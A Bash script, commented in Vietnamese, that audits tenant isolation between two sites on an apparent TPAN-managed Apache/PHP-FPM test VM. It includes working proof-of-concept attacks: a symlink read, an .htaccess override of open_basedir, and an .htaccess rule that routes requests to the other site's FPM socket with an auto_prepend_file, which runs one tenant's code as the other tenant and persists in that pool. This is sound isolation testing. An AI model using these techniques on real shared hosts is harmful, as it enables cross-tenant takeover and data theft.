#!/bin/bash
# Thử cô lập giữa hai site do TPAN tạo, stack Apache (LAMP).
# Chạy trên Mac:  multipass exec tpan-nc -- sudo bash < t1-apache-co-lap.sh
# Máy ảo tpan-nc là máy thử riêng, không có dữ liệu thật. Script tự dọn ở cuối.
# Mọi "mã tấn công" chỉ in tên user đang chạy và CÓ/KHÔNG, không in mật khẩu.
set -u
A=a.example.com; B=b.example.com
DA=/var/www/$A; DB=/var/www/$B
UA=$(stat -c %U $DA); UB=$(stat -c %U $DB)
POOLB=$(grep -l "^user = $UB" /etc/php/*/fpm/pool.d/*.conf)
SOCKB=$(awk -F' = ' '/^listen = /{print $2}' "$POOLB")
ca(){ local p=$1; shift; curl -s --max-time 10 --resolve $A:80:127.0.0.1 "$@" "http://$A/$p"; }
cb(){ local p=$1; shift; curl -s --max-time 10 --resolve $B:80:127.0.0.1 "$@" "http://$B/$p"; }
as_a(){ runuser -u "$UA" -- "$@"; }
echo "## 0. Môi trường"
apache2 -v | head -1; php -v | head -1; tpan version 2>/dev/null | head -1
echo "site A: $A user=$UA | site B: $B user=$UB | socket B: $SOCKB"
ls -ld $DA $DA/public $DB/public/wp-config.php

echo; echo "## 1. Nền: user A chạm thẳng vào site B (mong đợi: cả ba bị từ chối)"
as_a cat $DB/public/wp-config.php >/dev/null; echo "  đọc wp-config của B: mã $?"
as_a ls $DB >/dev/null;                        echo "  liệt kê thư mục B: mã $?"
as_a touch $DB/public/x-cua-a;                 echo "  ghi vào public của B: mã $?"

echo; echo "## 2. Log của site B"
ls -l /var/log/tpan/sites/$B/
as_a head -c 60 /var/log/tpan/sites/$B/access.log >/dev/null; echo "  user A đọc access.log của B: mã $? (0 = đọc được)"

echo; echo "## 3. /proc"
findmnt -no OPTIONS /proc
echo "  user A thấy tiến trình của các user:"; as_a ps -eo user= | sort | uniq -c | sort -rn | head -6

echo; echo "## 4. Cấu hình và socket"
as_a cat "$POOLB" >/dev/null; echo "  user A đọc file pool của B: mã $? (0 = đọc được)"
as_a test -w "$SOCKB";        echo "  user A ghi được socket FPM của B: mã $? (1 = không)"

echo; echo "## 5. Symlink qua Apache (TPAN đặt Options SymLinksIfOwnerMatch)"
printf 'NOI_DUNG_RIENG_CUA_B\n' > $DB/public/rieng.txt; chown $UB:www-data $DB/public/rieng.txt; chmod 640 $DB/public/rieng.txt
as_a ln -sf $DB/public/rieng.txt $DA/public/lay.txt
echo "  GET /lay.txt -> HTTP $(ca lay.txt -o /dev/null -w '%{http_code}')"

echo; echo "## 6. .htaccess của A tự nới open_basedir của chính pool A"
as_a tee $DA/public/t.php >/dev/null <<'EOF'
<?php echo "user=".posix_getpwuid(posix_geteuid())["name"]." | open_basedir=".ini_get("open_basedir")." | doc /etc/hostname: ".(@file_get_contents("/etc/hostname")!==false?"CO":"KHONG")."\n";
EOF
echo -n "  trước: "; ca t.php
cp -p $DA/public/.htaccess /root/htaccess-a.goc
as_a tee -a $DA/public/.htaccess >/dev/null <<'EOF'

SetEnv PHP_ADMIN_VALUE "open_basedir=/"
EOF
echo -n "  sau khi thêm 1 dòng SetEnv vào .htaccess: "; ca t.php
cp -p /root/htaccess-a.goc $DA/public/.htaccess

echo; echo "## 7. .htaccess của A gửi request sang pool của B, kèm cấu hình PHP do A chọn"
as_a tee /tmp/tpan-nc-dau.php >/dev/null <<EOF
<?php echo "MA DO A VIET dang chay duoi user: ".posix_getpwuid(posix_geteuid())["name"]." | doc duoc wp-config.php cua B: ".(is_readable("$DB/public/wp-config.php")?"CO":"KHONG")."\n"; exit;
EOF
chmod 644 /tmp/tpan-nc-dau.php
as_a touch $DA/public/qua.php
as_a tee -a $DA/public/.htaccess >/dev/null <<EOF

<Files "qua.php">
    SetHandler "proxy:unix:$SOCKB|fcgi://localhost"
    ProxyFCGISetEnvIf "true" SCRIPT_FILENAME "$DB/public/index.php"
    ProxyFCGISetEnvIf "true" PHP_ADMIN_VALUE "open_basedir=/ \n auto_prepend_file=/tmp/tpan-nc-dau.php"
</Files>
EOF
echo -n "  GET http://$A/qua.php -> "; ca qua.php | head -c 300; echo
cp -p /root/htaccess-a.goc $DA/public/.htaccess

echo; echo "## 7b. A đã gỡ đoạn trên khỏi .htaccess. Khách vào trang chủ của B bây giờ nhận gì?"
echo -n "  GET http://$B/ -> "; cb "" | head -c 120; echo
echo "  (cấu hình A bơm vào nằm lại trong tiến trình PHP của B cho tới khi tiến trình đó thoát)"
systemctl restart "php$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;')-fpm"; sleep 1
echo -n "  sau khi khởi động lại PHP-FPM: GET http://$B/ -> HTTP "; cb "" -o /dev/null -w '%{http_code}'; echo

echo; echo "## 9. Dọn"
rm -f $DA/public/{t.php,qua.php,lay.txt} $DB/public/rieng.txt $DB/public/x-cua-a /tmp/tpan-nc-dau.php /root/htaccess-a.goc
echo "đã dọn"
